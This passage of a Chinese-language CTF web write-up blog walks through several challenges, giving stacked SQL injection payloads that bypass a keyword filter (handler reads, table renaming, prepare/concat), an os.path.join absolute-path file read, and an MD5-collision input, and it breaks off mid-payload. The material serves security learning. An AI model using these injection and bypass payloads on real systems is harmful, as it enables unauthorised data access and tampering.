<span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"real_flag_is_in_'flag'\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"换个思路，试试PHP伪协议呢\"</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>不在 flag.php，那就读取 /flag。</p>\n<p>最终得到 flag.</p>\n<h3 id=\"强网杯-2019随便注\"><a class=\"anchor\" href=\"#强网杯-2019随便注\">#</a> [强网杯 2019] 随便注</h3>\n<h4 id=\"堆叠注入关键字绕过\"><a class=\"anchor\" href=\"#堆叠注入关键字绕过\">#</a> 堆叠注入，关键字绕过</h4>\n<p>判断回显知为单引号闭合。</p>\n<p>输入 0' union select 1,2# 回显出</p>\n<blockquote>\n<p>return preg_match(&quot;/select|update|delete|drop|insert|where|./i&quot;,$inject);</p>\n</blockquote>\n<p>尝试使用堆叠注入</p>\n<blockquote>\n<p>1';show databases;#</p>\n</blockquote>\n<p>得库，</p>\n<p>再使用</p>\n<blockquote>\n<p>1';show tables;#</p>\n</blockquote>\n<p>得表。</p>\n<p>知道有两个表一个为 'words', 一个为 '1919810931114514'，看看他两分别有什么字段：</p>\n<blockquote>\n<p>1' ;show columns from words;#</p>\n</blockquote>\n<blockquote>\n<p>1';show columns from `1919810931114514`#</p>\n</blockquote>\n<p>这里表名为数字时，要用反引号包起来来查询。</p>\n<p>表 words 里面有 id 字段，结合开始输入 1 回显出的结果，可知我们现在处于 words 表中，</p>\n<p>表 '1919810931114514' 里面有 flag，最终的 flag 就在里面，现在就是想办法查询表 '1919810931114514'，</p>\n<p>有三种方法：</p>\n<p>第一种：</p>\n<p>handler 语法：让我们一行一行浏览一个表的数据（mysql 的专用语句，其他 sql 语言无）</p>\n<pre><code class=\"language-mysql\">handler users open as hd;#载入指定的数据表“users”并返回句柄“hd”\nhandler hd read first;#读取数据表首行\nhandler hd read next;#读取下一行\nhandler hd close;#关闭句柄\n\n</code></pre>\n<p>所以直接构建 payload:</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>1'<span class=\"token punctuation\">;</span>handler `1919810931114514` open <span class=\"token punctuation\">;</span>handler `1919810931114514` read first<span class=\"token punctuation\">;</span>#</pre></td></tr></table></figure><p>第二种:</p>\n<p>alter 作用：修改已知表的列。</p>\n<pre><code class=\"language-mysql\">alter table &quot; table_name&quot; add &quot; column_name&quot; type;#添加一个列\nalter table &quot; table_name&quot; drop &quot;column_name&quot;  type;#删除一个列\nalter table &quot; table_name&quot; alter column &quot;column_name&quot; type;#改变列的数据\nalter table &quot; table_name&quot; change &quot;column1&quot; &quot;column2&quot; type;#改列名\nalter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;#改列名\n\n \n</code></pre>\n<p>跟刚才一样，我们还有一个数据表的名字叫 “words”；于是萌生一种大胆的想法，后端执行的语句为</p>\n<p>select * from words where id = '$id';</p>\n<p>我们就可以把表 “words” 改名为其他的，而将 “1919810931114514” 改名为 “words”，这样就能让那个后台直接从表 “1919810931114514” 里查询；于是乎</p>\n<pre><code class=\"language-mysql\">1';\nrename table `words` to `words1`;\nrename table `1919810931114514` to `words`;\nalter table `words` change `flag` `id` varchar(100) character set utf8 collate utf8_general_ci not NULL;#\n</code></pre>\n<p>成功 rename 之后，我便可以直接只用单引号闭合的方法直接查取到 flag</p>\n<p>1' or 1=1#</p>\n<p>第三种：</p>\n<p>通过 mysql 中的预处理来拼接，从而达成绕过。</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>1'<span class=\"token punctuation\">;</span>prepare s <span class=\"token keyword\">from</span> <span class=\"token function\">concat</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"s\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"elect\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"*from `1919810931114514`\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>execute s<span class=\"token punctuation\">;</span>#</pre></td></tr></table></figure><h3 id=\"ciscn-2019华东南web11\"><a class=\"anchor\" href=\"#ciscn-2019华东南web11\">#</a> [CISCN 2019 华东南] Web11</h3>\n<h4 id=\"sstismartrce\"><a class=\"anchor\" href=\"#sstismartrce\">#</a> SSTI,smart,rce</h4>\n<p>smart 模板注入</p>\n<p>可以参考这篇文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgxL2FydGljbGUvZGV0YWlscy8xMDc1NTY5MTU=\">php 的模板注入 (smart 模板)</span></p>\n<h2 id=\"2023916\"><a class=\"anchor\" href=\"#2023916\">#</a> 2023/9/16</h2>\n<h3 id=\"nisactf-2022babyupload\"><a class=\"anchor\" href=\"#nisactf-2022babyupload\">#</a> [NISACTF 2022]babyupload</h3>\n<h4 id=\"文件上传ospathjoin漏洞python\"><a class=\"anchor\" href=\"#文件上传ospathjoin漏洞python\">#</a> 文件上传，os.path.join 漏洞，python</h4>\n<p>可以参考这篇文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NjcxNDI4NzU=\">警惕！Python 中少为人知的 10 个安全陷阱</span></p>\n<p>打开后是个文件上传界面，检查网页源代码发现提示有个 /source 文件。<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hcHAtdHU5ZG4xbTY5Y24yMmF0OGE2OW1vMGkucHk=\">打开后得到文件 app.py</span>:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> redirect<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">,</span> send_from_directory</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sqlite3</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> uuid</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>SCHEMA <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">\"\"\"CREATE TABLE files (</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    id text primary key,</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    path text</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>);</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\"\"\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">db</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    g_db <span class=\"token operator\">=</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span> <span class=\"token string\">'_database'</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span> g_db <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        g_db <span class=\"token operator\">=</span> g<span class=\"token punctuation\">.</span>_database <span class=\"token operator\">=</span> sqlite3<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token string\">\"database.db\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> g_db</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>before_first_request</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">setup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    os<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token string\">\"database.db\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    cur <span class=\"token operator\">=</span> db<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    cur<span class=\"token punctuation\">.</span>executescript<span class=\"token punctuation\">(</span>SCHEMA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">hello_world</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token triple-quoted-string string\">\"\"\"&lt;!DOCTYPE html></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>&lt;html></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>&lt;body></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>&lt;form action=\"/upload\" method=\"post\" enctype=\"multipart/form-data\"></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    Select image to upload:</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    &lt;input type=\"file\" name=\"file\"></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    &lt;input type=\"submit\" value=\"Upload File\" name=\"submit\"></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>&lt;!-- /source --></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>&lt;/body></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>&lt;/html>\"\"\"</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/source'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">source</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">return</span> send_from_directory<span class=\"token punctuation\">(</span>directory<span class=\"token operator\">=</span><span class=\"token string\">\"/var/www/html/\"</span><span class=\"token punctuation\">,</span> path<span class=\"token operator\">=</span><span class=\"token string\">\"www.zip\"</span><span class=\"token punctuation\">,</span> as_attachment<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/upload'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">upload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">'file'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> request<span class=\"token punctuation\">.</span>files<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>files<span class=\"token punctuation\">[</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">\".\"</span> <span class=\"token keyword\">in</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>filename<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Bad filename!\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">403</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    conn <span class=\"token operator\">=</span> db<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    cur <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    uid <span class=\"token operator\">=</span> uuid<span class=\"token punctuation\">.</span>uuid4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        cur<span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">(</span><span class=\"token string\">\"insert into files (id, path) values (?, ?)\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>uid<span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>filename<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">except</span> sqlite3<span class=\"token punctuation\">.</span>IntegrityError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Duplicate file\"</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    conn<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">'uploads/'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span><span class=\"token string\">'/file/'</span> <span class=\"token operator\">+</span> uid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/file/&lt;id>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">file</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    conn <span class=\"token operator\">=</span> db<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    cur <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    cur<span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">(</span><span class=\"token string\">\"select path from files where id=?\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    res <span class=\"token operator\">=</span> cur<span class=\"token punctuation\">.</span>fetchone<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token keyword\">if</span> res <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"File not found\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">404</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token comment\"># print(res[0])</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token string\">\"uploads/\"</span><span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        <span class=\"token keyword\">return</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span><span class=\"token number\">80</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>大致意思就是文件名不能包含 '.'，上传文件后生成一个唯一的 UUID 作为文件标识符，保存上传的文件到指定路径，重定向到查看上传文件的路由，之后根据文件标识符查询文件路径，利用 os.path.join 函数拼接路径后，打开文件并读取文件内容，然后再返回文件内容。</p>\n<p>这题漏洞利用点就在 os.path.join 这个函数：</p>\n<p><code>os.path.join(path, *paths)</code>  函数用于将多个文件路径连接成一个组合的路径。第一个参数通常包含了基础路径，而之后的每个参数都被当做组件拼接到基础路径后。</p>\n<p>然而，这个函数有一个少有人知的特性。如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将被视为绝对路径。所以如果我们上传的文件名为 /flag，就真的访问到系统根目录下的文件 flag。</p>\n<p>所以说随便上传个文件，用 bp 中途截包后，将文件名改为 /flag，重定向后就可以获取到 flag。</p>\n<h3 id=\"nisactf-2022level-up\"><a class=\"anchor\" href=\"#nisactf-2022level-up\">#</a> [NISACTF 2022]level-up</h3>\n<h4 id=\"正则绕过phpcreation_functionrcewaf绕过md5碰撞\"><a class=\"anchor\" href=\"#正则绕过phpcreation_functionrcewaf绕过md5碰撞\">#</a> 正则绕过，PHP，creation_function,rce,WAF 绕过，md5 碰撞.</h4>\n<p>打开题目页面后直接检查网页源代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nothing here</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> here is level <span class=\"token number\">1</span> <span class=\"token operator\">--</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> disallow<span class=\"token punctuation\">:</span> <span class=\"token operator\">--</span><span class=\"token operator\">></span></pre></td></tr></table></figure><p>看到这种提示直接访问 robots.txt 文件。</p>\n<p>得到：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token property\">User-agent</span><span class=\"token punctuation\">:</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token property\">Disallow</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token property\">Disallow</span><span class=\"token punctuation\">:</span> level_2_1s_h3re.php</pre></td></tr></table></figure><p>访问 /level_2_1s_h3re.php</p>\n<p>进入第二阶段：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//here is level 2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"str.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'array1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'array2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$a1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'array1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$a2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'array2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a1</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$a2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"????\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$level3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"level 2 failed ...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这题由于</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$a1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'array1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'array2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>不能使用数组来绕过 md5 强类型比较了，去网上搜一下 md5 加密后相等的字符串就行了。</p>\n<p>用 bp 截包后发送 exp</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>array1=M<span class=\"token placeholder selector\">%C9h</span><span class=\"token placeholder selector\">%FF</span><span class=\"token placeholder selector\">%0E</span><span class=\"token placeholder selector\">%E3</span><span class=\"token placeholder selector\">%5C</span><span class=\"token placeholder selector\">%20</span><span class=\"token placeholder selector\">%95r</span><span class=\"token placeholder selector\">%D4w</span><span class=\"token placeholder selector\">%7Br</span><span class=\"token placeholder selector\">%15</span><span class=\"token placeholder selector\">%87</span><span class=\"token placeholder selector\">%D3o</span><span class=\"token placeholder selector\">%A7</span><span class=\"token placeholder selector\">%B2</span><span class=\"token placeholder selector\">%1B</span><span class=\"token placeholder selector\">%DCV</span><span class=\"token placeholder selector\">%B7J</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%C0x</span><span class=\"token placeholder selector\">%3E</span><span class=\"token placeholder selector\">%7B</span><span class=\"token placeholder selector\">%95</span><span class=\"token placeholder selector\">%18</span><span class=\"token placeholder selector\">%AF</span><span class=\"token placeholder selector\">%BF</span><span class=\"token placeholder selector\">%A2</span><span class=\"token placeholder 